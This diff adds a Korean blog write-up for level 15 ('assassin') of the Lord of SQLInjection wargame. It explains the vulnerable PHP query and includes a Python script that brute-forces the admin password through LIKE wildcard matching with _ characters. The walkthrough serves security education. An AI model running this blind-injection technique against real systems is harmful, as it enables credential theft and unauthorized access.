@@ -2641,4 +2641,123 @@ section 진행 기간
         <tag>Write UP</tag>
       </tags>
   </entry>
+  <entry>
+    <title>[Lord of SQLInjection] [15번_assassin] Write UP</title>
+    <url>/2021/10/24/2021-10-23-Lord_of_SQLInjection_15_assassin/</url>
+    <content><![CDATA[<h1 id="🎨-전체-소스코드"><a href="#🎨-전체-소스코드" class="headerlink" title="🎨 전체 소스코드"></a>🎨 전체 소스코드</h1><br>
+
+<p>15번 문제인 assassin를 클릭하면 아래와 같이 소스코드와 쿼리문이 나옵니다.</p>
+<br>
+
+<img src="/images/Lord of SQLInjection/assassin/source.png">
+
+<br>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>; </span><br><span class="line">  login_chk(); </span><br><span class="line">  <span class="variable">$db</span> = dbconnect(); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\&#x27;/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id from prob_assassin where pw like &#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class="line">  <span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>]) <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;Hello <span class="subst">&#123;$result[id]&#125;</span>&lt;/h2&gt;&quot;</span>; </span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>) solve(<span class="string">&quot;assassin&quot;</span>); </span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<br>
+
+<hr>
+<br>
+
+<h1 id="🔔-중요-소스코드-해석"><a href="#🔔-중요-소스코드-해석" class="headerlink" title="🔔 중요 소스코드 해석"></a>🔔 중요 소스코드 해석</h1><br>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\&#x27;/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select id from prob_assassin where pw like &#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class="line"><span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>]) <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;Hello <span class="subst">&#123;$result[id]&#125;</span>&lt;/h2&gt;&quot;</span>; </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>) solve(<span class="string">&quot;assassin&quot;</span>); </span><br></pre></td></tr></table></figure>
+
+<br>
+
+<br>
+
+<h2 id="1-줄-해석"><a href="#1-줄-해석" class="headerlink" title="1 줄 해석"></a>1 줄 해석</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\&#x27;/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br></pre></td></tr></table></figure>
+
+<p><code>preg_match</code>라는 함수가 있습니다.</p>
+<p><code>preg_match</code>함수는 특정한 문자를 필터링할 때 사용합니다.</p>
+<p><code>pw 파라미터</code> <code>&#39;</code>를 필터링 하고 있습니다. <code>/i</code>는 대소문자를 구분하지 않는다는 뜻입니다.</p>
+<br>
+
+<br>
+
+<h2 id="2-줄-해석"><a href="#2-줄-해석" class="headerlink" title="2 줄 해석"></a>2 줄 해석</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select id from prob_assassin where pw like &#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><code>like</code>는 특정 문자를 몰라도 검색할 수 있는 와일드카드 <code>%</code>와 <code>_</code>를 지원합니다.</p>
+<p>예를 들어 <code>%</code>는 S%L 이면 S1231L, SL, SQL 등 을 모두 가져옵니다.</p>
+<p>만약 <code>_</code>는 S_L 이면 S1231L, SL은 가져올 수 없고, SQL는 가져올 수 있습니다.</p>
+<br>
+
+<br>
+
+<h2 id="6-줄-해석"><a href="#6-줄-해석" class="headerlink" title="6 줄 해석"></a>6 줄 해석</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>) solve(<span class="string">&quot;assassin&quot;</span>); </span><br></pre></td></tr></table></figure>
+
+<p><code>id</code>가 <code>admin</code>이면 문제가 풀립니다.</p>
+<br>
+
+<br>
+
+<hr>
+<br>
+
+<h1 id="🙆‍♀️-SOLVE"><a href="#🙆‍♀️-SOLVE" class="headerlink" title="🙆‍♀️ SOLVE"></a>🙆‍♀️ SOLVE</h1><br>
+
+<img src="/images/Lord of SQLInjection/assassin/solve_1.png">
+
+<br>
+
+<p>일단 확인을 위해 <code>%</code>만 넣어주었습니다.</p>
+<p><code>Hello guest</code>라고 나오는 것을 보아 테이블의 행은 <code>admin</code>보다 <code>guest</code>가 위에 있는 것을 확인할 수 있습니다.</p>
+<br>
+
+<br>
+
+<p>일단 <code>pw</code>길이를 알아보기 위해 <code>_</code>를 하나씩 추가하면서 길이를 찾아보았습니다.</p>
+<p>8개를 넣었더니 <code>Hello guest</code>가 출력되었습니다.</p>
+<p><code>pw</code> 길이는 8글자입니다.</p>
+<br>
+
+<img src="/images/Lord of SQLInjection/assassin/solve_2.png">
+
+<br>
+
+<br>
+
+<p>한 글자 씩 대입하려면 시간이 오래 걸리기 때문에 파이썬을 사용해 줍니다.</p>
+<br>
+
+<br>
+
+<h2 id="파이썬-코드"><a href="#파이썬-코드" class="headerlink" title="파이썬 코드"></a>파이썬 코드</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php?pw=&quot;</span></span><br><span class="line">head = &#123;<span class="string">&#x27;Cookie&#x27;</span> : <span class="string">&#x27;PHPSESSID=값&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">length = <span class="number">1</span></span><br><span class="line">pwd = <span class="string">&#x27;&#x27;</span></span><br><span class="line">query = <span class="string">&quot;_&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">    query = <span class="string">&quot;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(query)</span><br><span class="line">    req = requests.get(url+query, headers=head)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[ +&quot;</span>,length,<span class="string">&quot;]&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;Hello guest&quot;</span> <span class="keyword">in</span> req.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;총 길이는&quot;</span>,length)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        length = length + <span class="number">1</span></span><br><span class="line">        query = query + <span class="string">&quot;_&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length+<span class="number">1</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;찾는중.. &quot;</span>,i,<span class="string">&quot;번째 문자&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>, <span class="number">122</span>):</span><br><span class="line">        query = <span class="string">&quot;_&quot;</span> * (i-<span class="number">1</span>) + <span class="built_in">chr</span>(j) + <span class="string">&quot;_&quot;</span> * (length-i)</span><br><span class="line">        req = requests.get(url+query, headers=head)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Hello admin&quot;</span> <span class="keyword">in</span> req.text:</span><br><span class="line">            pwd += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;Hello guest&quot;</span> <span class="keyword">in</span> req.text:</span><br><span class="line">            result = <span class="built_in">chr</span>(j)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(pwd)&lt;i:</span><br><span class="line">        pwd = pwd + result</span><br><span class="line">            </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;pw : &quot;</span>,pwd)</span><br></pre></td></tr></table></figure>
+
+
+
+<br>
+
+<img src="/images/Lord of SQLInjection/assassin/solve_3.png">
+
+<br>
+
+<p>자동으로 <code>pw</code>의 길이와 <code>pw</code>를 구해 줍니다.</p>
+<br>
+
+<br>
+
+<p>파이썬 코드를 돌려서 나온 <code>pw</code> 값을 넣어주면 문제가 풀립니다.</p>
+<img src="/images/Lord of SQLInjection/assassin/solve_4.png">
+
+<br>
+
+<br>
+
+<blockquote>
+<p>SOLVED !!!</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>Lord of SQLInjection</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+        <tag>Write UP</tag>
+      </tags>
+  </entry>
 </search>
